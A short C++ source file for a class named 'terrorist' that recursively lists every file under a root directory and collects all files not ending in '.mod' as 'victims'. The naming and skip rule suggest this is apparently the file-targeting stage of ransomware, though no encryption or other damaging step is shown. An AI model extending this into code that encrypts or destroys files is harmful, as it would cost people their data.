#include "terrorist.h"

std::vector<std::string> terrorist::get_all_paths(std::string &root_path){
    std::vector<std::string> paths;
    for (auto &i : std::filesystem::directory_iterator(root_path)){
        paths.push_back(i.path().string());
    }
    return paths;
}

void terrorist::dir_work(std::string root_dir) {
    std::vector<std::string> files_and_dirs = get_all_paths(root_dir);
    for(auto &i : files_and_dirs){
        if(std::filesystem::is_directory(i)){
            dir_work(i);
            } else{
            if(!i.ends_with(".mod")){
                victims.push_back(i);
            }
        }
    }

}

terrorist::terrorist(std::string main_victim) {
dir_work(main_victim);
}